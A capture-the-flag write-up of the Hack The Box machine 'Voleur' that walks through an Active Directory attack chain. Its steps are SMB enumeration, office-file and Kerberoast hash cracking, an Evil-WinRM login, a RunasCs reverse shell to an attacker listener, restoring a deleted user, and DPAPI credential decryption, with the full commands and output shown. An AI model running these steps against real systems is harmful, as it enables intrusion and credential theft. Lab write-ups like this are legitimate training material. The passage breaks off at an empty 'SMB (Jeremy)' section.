---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Kerberoasting
  - Bloodhound
  - TargetedKerberoast
  - Secrets-Dump
  - DPAPI
---
# Overview

| Name        | Voleur      |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor` / `HollowOct31Nyt`
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A 10.10.11.76
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 10:32 +0545
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.90% done; ETC: 10:33 (0:00:00 remaining)
Nmap scan report for 10.10.11.76
Host is up (0.33s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-08 12:47:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2025-09-08T12:48:21
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 8h00m01s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   324.95 ms 10.10.14.1
2   335.60 ms 10.10.11.76
```

```bash
❯ hostfile --linux 10.10.11.76 voleur.htb
Added to /etc/hosts:
   10.10.11.76 voleur.htb

❯ hostfile --linux 10.10.11.76 dc.voleur.htb
Added to /etc/hosts:
   10.10.11.76 dc.voleur.htb

❯ sudo ntpdate voleur.htb
2025-09-08 18:35:56.661998 (+0545) +28801.863685 +/- 0.357798 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28801.863685
```
# Enumeration

```bash
❯ sudo timedatectl set-ntp off

❯ sudo rdate -n 10.10.11.76
Mon Sep  8 18:41:04 +0545 2025

❯ impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ryan.naylor.ccache

❯ export KRB5CCNAME=/home/at0m/Hentai/HTB/voleur/ryan.naylor.ccache

❯ nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt

❯ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```
## SMB Shares

```bash
❯ nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares --smb-timeout 500

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

```bash
❯ impacket-smbclient -k dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 14:55:01 2025 .
drw-rw-rw-          0  Mon Sep  8 16:44:51 2025 ..
drw-rw-rw-          0  Wed Jan 29 15:25:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 15:25:17 2025 .
drw-rw-rw-          0  Wed Jan 29 14:55:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 04:08:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```

![[voleur.png]]

Requires Password.
## Office2John

```bash
❯ office2john Access_Review.xlsx > hash.txt

❯ locate rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt.gz
                                                 
❯ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
                                                 
~/Hentai/HTB/voleur ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We get password as `football1` on cracking.

![[voleur2.png]]

We get some creds:

```
svc_ldap:M1XyC9pW7qT5Vn
svc_iis:N5pXyW1VqM7CZ8
todd.wolfe:NightT1meP1dg3on14
```

Read Notes too it has hints for whole machine.
## Bloodhound

```bash
❯ bloodhound-python -u svc_ldap -p M1XyC9pW7qT5Vn -k -ns 10.10.11.76 -c All -d voleur.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 01M 08S
INFO: Compressing output into 20250908190512_bloodhound.zip
```
## Targeted Keberoasting

![[voleur3.png]]

`WriteSPN` permission on `svc_winrm`, then get the ticket via kerberoasting.

```bash
❯ impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_ldap.ccache

❯ export KRB5CCNAME=/home/at0m/Hentai/HTB/voleur/svc_ldap.ccache
```

```bash
❯  python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$0a540f4b2f83ae5ef2b605af8d6a3a52$9c6431c740405846429a11fb39a4ed8d760fd0e95e50d702dfdd5632076c733740860b6a051e1159cd3aa63cd274617ffee4ae163995393690993dd51828e82b26b49689c95dce7381423a00d61321cbae028e647c1ca27fc1bebe88d37e0d152e8e2c737fc516e5008b6acfa961b02d4edb8a6d5d0607b00c4ffa9468e24b708762273133cc057399e450a9deceada1ff79fa2bba98b8b66d56586c4dadd0c8d490ec00ebf882705650ba11339f7bd4da0999e73952f70c4c5fcaccc635136cc55ef0e50ea1c88d85e7efea548fcc5478ed3bf4e28122264a4a86d0514001125d97a50792605b108cb739ba68dae9d883e107dc8b6eda5a0ed072d165d6dfbfaa7f535a6da6adbae72872838587ffe72b2c1c95d7e46eaf51091a40ba7fb47801ab0ad54bbe88be9bf6c1e3245d5d9dc3fea2e07c2d53325879160e3605e41b11f82d63037b0e367627204dd057da488afd1e04dc9fb470ab5c6244995e508d88505bef24f572d25a9c4e6fdd293db8852d040e76077e9d288f20271b0e87f4fbcfb75abce7f93b9bb64030b2173cc3e3ebb4daa27b93b7e0238fb84be14f69cac38398f671fc6572aa0114ba9cf8166bf0f34ab96c503c8778107731182adbd652a5603eb7b0b9430640fd101c16e34fae16bbe04fdabf375b7157bacc0c1a852816ce3100e8e824be654b593bd0e4438732e02c6139d2e98e0df603b8cd7771f7385fece8716d210205a888f6554c04d38c75d8a76ca61a63ea7aa715a084a9de82965e7af545b8979be9425d29c162e3a83fc3f33bb5fbfc2bba10990ff40f58ffe821e66680372fab999a5c17bb861603028a9d940f5afc8abca925b234cc969fddf8f2f13f2d69f9091ce231afd543cb57de9924298d82bba9290a2dadfa99629f15a64a161b6c00bfb0afd1c40f3da7d4b067e300a03452799a534b0b2c1e5689139ade666c469ead20f0552e2c169d813681441cf9ef6b6768be31d0f17e6772dcc563a88d2a1eaf6cae7216b48fa3daf61863007ccee930c1f38f175af7bcc1dd4f209a28e111d2792a089e13c4853c3ea8242c6ef20e18deee34afbe5856868126187e87d8b1ab2d9bf3fcd9ab4e9c15410d42898d7c83ac92a77b0bfcb5ab74205fc020faf4eb5dfe1f13259ec380244c94c6e32c871a46d76925b2557abc0850bbe6b1e22cee9e7007063cb69bc9496d6551adf37b039800ae27c9381677f83f7e4c363566d3c4e6521342f7d655961afca4fe55d62871268e4ce6a17e3288da59eeb84475513f7a6804a5728aa077f21e94cc7db961835b9e985cc8df7b6eac7d46e02f736580e51f24314ba305a9da269e23ccf2a6e4f9dc4ba344b1e56a286df45dfe644aaf28dd8ab17761095dfaf67abfcf6022658c99da1ff3902d36fe11c98d0011b06b5802ed843617d46bd6603b9a7c87c51894b60d703d99fd48a8fe755a865deee3eb53a46b9a3e
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$d09d1bc6c8ba25ecb4709d33f126a079$2ffb26d7684ee960039ffb05111bd329c1375d2f67e97e184c94c1a59387c56b805159bdc86af555ce9085f821862403ab302fa97fa22316806305a940849c6ea6ec49c647db9e89679edec5ce1d3ebba8bf243379848a6c7c178e8b2a45a7307b9fa5071eb50a1317b4d6a192b55cf1adb1c3747ce21199f275eb871a7a8aab563e0158f8919e4706ccfe9e520104373ad385f0af8de9281a3d7686fe264579eb4e2ad69f7fe9796827bb522409f8d9f8a92795f0b2078113570960970ac7ea583f34c83a4bcff273007ae3ad44996fff765b4eeab5705ddcb66e37f74a7f9f8b89649092f11527c20743bb908c741f6274aa387c8d4d5f71514ae0f96cb5034b95e613a862998fa73eea94b22766b504e50a0ce440eecb1377c3dd8281b9d155c03a39b926da88b8ba7f238163e711c827a2552a8738c7add0f907b86818d759f39d0584ffb0d94123c5e8867f8ac89c6d5fba8adefdf659f61e1329ef1b8e4d749afd6b7bfb0192d1c0f6e0e807e793dee5c1abb28cd3d98fd4ee0c1c2806c5a2b2551820551dc544951a5c84c2daf091e6e06f2fc4730ce401a7d5eccfc4746d2aa4a994fe33235dbca59f284ded1688d7cd3fd6a0a48a78456e7f8c78af16fd61b7e7df13a30803501a70b906e32adfdcc1aabda308d0ca933e7783afed07e40923649dfc4bed913367125a82683b99d71c22994aa0ab2c2cc2a46f4026b63f12637f6a55ae08032bb52c51006bfad1e14d9748c035dd18972c4146d03684ff30cd181a77ba97da235b6aed8edf51fbe15129cd68762b8ca216f5405a3eb07585ca4b1199fdd76ac4da172475112ea1b5c0a85928d72008f0c362354ade28bb1a2366bd4cff9a6a024916868e6eac6f7eddd6ee19ad9ea670cd0c0b88ab2417f9c0834f4d1352a772b44d6b978a198a50ef11e3987651d93a6b4f542d75e7001e47d6fc62e8ede8226387b3e4780694c82a8f39413704933edbe5de4d6456a545bb5d29e598ce8d619d2cfd79969f8d1aa6a38fea9c1466ea4114b777d0e4777a597255e08efdaac1498838452137fc05d7eee7f44030c1179589a7c367370a75ed6dcaba37e2a3f58529f1bd0bf660577857b2686b6e3a2349822000d7321601ee044c656118f70f99303839a2de86b0d543fa3dd578672d9028511d235b866894cf2bba60686fe09d21b1e3e620e3b979374edd408007169c5c249de057a13892a34bfc96a8fbb12ec70da0601258a3d521561340dcc6ad665a4de295adf05ac9b1f96e32af57297945e15e13dccd069a992a149069743bfcc2d47cc8b9bd1ed26a0ab433c77cb45b350015ad72940ef6d2be7834536dd420746ada22530fd905047b797f078570300c5692b90ced13c662da0c15a72f62dcbc4c776e57499c6ee562d30abe8d7cabfb43efacc11830c5f65eb09fc0126b8e9f200a9bed8c469a7d57222275481ece9f82356e43ade4
```
## JohnTheRipper

```bash
┌─[us-free-1]─[10.10.14.233]─[at0mxploit@htb-wwri3hwpg0]─[~]
└──╼ [★]$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /home/at0mxploit/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:05 DONE (2025-09-08 00:40) 0.1841g/s 2112Kp/s 2112Kc/s 2112KC/s AHANACK6978012..AFITA4162
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
┌─[us-free-1]─[10.10.14.233]─[at0mxploit@htb-wwri3hwpg0]─[~]
└──╼ [★]$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:06 DONE (2025-09-08 00:43) 0g/s 2109Kp/s 2109Kc/s 2109KC/s !!12Honey..*7¡Vamos!
Session completed.
```

We got `svc_winrm:AFireInsidedeOzarctica980219afi` and `lacey.miller:!!12Honey..*7¡Vamos!`.
## Evil-WinRM

Direct rejects don't know why so again making cache ticket.

```bash
❯ impacket-getTGT voleur.htb/'lacey.miller':'!!12Honey..*7¡Vamos!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)

❯ impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_winrm.ccache
```

Only `svc_winrm` worked.

```bash
❯ evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: User is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspe
cified GSS failure.  Minor code may provide more information
Cannot find KDC for realm "VOLEUR.HTB"


Error: Exiting with code 1
```

Need a `krb5.conf` file.

```bash
❯ nvim /etc/krb5.conf

❯ sudo nvim /etc/krb5.conf
[sudo] password for at0m:

❯ cat /etc/krb5.conf
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = 10.10.11.76
    admin_server = 10.10.11.76
  }

[domain_realm]
  voleur.htb = VOLEUR.HTB


❯ export KRB5CCNAME=/home/at0m/Hentai/HTB/voleur/svc_winrm.ccache


❯ evil-winrm -i dc.voleur.htb -u svc_winrm -r VOLEUR.HTB


Evil-WinRM shell v3.7

<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---          9/7/2025   1:39 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
4f314d4948d88dce2d23cb32f6063bf1
```
# Privilege Escalation

Now in `Access_review.xlsx` we can see that user `todd.wolfe` has a been deleted or marked as deleted , so first we will restore that using `svc_ldap` , why `svc_ldap` because the account is a member of `Restore_Users` group.
## Restoring `todd.wolfe`

Download [RunasCS](https://github.com/antonioCoco/RunasCs) on Attack Machine.

```bash
❯ unzip RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe
  inflating: RunasCs_net2.exe
```

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload /home/at0m/Hentai/HTB/voleur/RunasCs.exe

Info: Uploading /home/at0m/Hentai/HTB/voleur/RunasCs.exe to C:\Users\svc_winrm\Desktop\RunasCs.exe

Data: 68948 bytes of 68948 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-a----          9/8/2025   7:07 AM          51712 RunasCs.exe
-ar---          9/7/2025   1:39 AM             34 user.txt
```

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.233:4444
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1cdd3ce$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 896 created in background.
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop>
```

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.76] 60044
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```

Now we are `svc_ldap`, then we can restore `todd.wolfe`:

```powershell

PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjectsGet-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
PS C:\Windows\system32>
```

Now list **all user accounts in the domain** that the domain controller knows about.

```bash
PS C:\Windows\system32> net user /domain
net user /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap   
todd.wolfe
The command completed successfully.
```

As we can see `todd.wolfe` recovery was a success.
## SMB (Todd)

We already have Todd password from excel. Do this step fast `todd.wolfe` deletes after certain time.

```bash
❯ impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in todd.wolfe.ccache

❯ export KRB5CCNAME=/home/at0m/Hentai/HTB/voleur/todd.wolfe.ccache

❯ impacket-smbclient -k -no-pass VOLEUR.HTB/todd.wolfe@dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 14:55:01 2025 .
drw-rw-rw-          0  Mon Sep  8 16:44:51 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:03 2025 Second-Line Support
# cd /Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:03 2025 .
drw-rw-rw-          0  Wed Jan 29 14:55:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:06 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:16 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 20:13:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 20:58:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 18:38:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 18:38:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 18:38:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Videos
# cd AppData
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:16 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Local
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 LocalLow
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Roaming
# cd Roaming/Microsoft
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Windows
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 18:58:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 18:58:50 2025 772275FAD58525253490A9B0039791D3
# cd ../
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 20:58:10 2025 Windows
# cd Protect
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 18:38:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 18:38:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 .
drw-rw-rw-          0  Wed Jan 29 20:58:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 18:54:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 18:38:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 18:38:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

We downloaded these two files which are DPAPI that stands for **Data Protection Application Programming Interface** encrypted keys.

```shell
get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88

get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
```
## Decrypting DPAPI Keys

We need SID also:

```bash
PS C:\Windows\system32> Get-ADUser -Identity "todd.wolfe" | Select-Object Name, SID
Get-ADUser -Identity "todd.wolfe" | Select-Object Name, SID

Name       SID
----       ---
Todd Wolfe S-1-5-21-3927696377-1337352550-2781715495-1110
```

```bash
❯ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Use that key to decrypt the file again:

```
❯ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

We got creds of `jeremy.combs:qT3V9pLXyN7W4m`. Augh Again SMB to Jeremy.
## SMB (Jeremy)

```bash

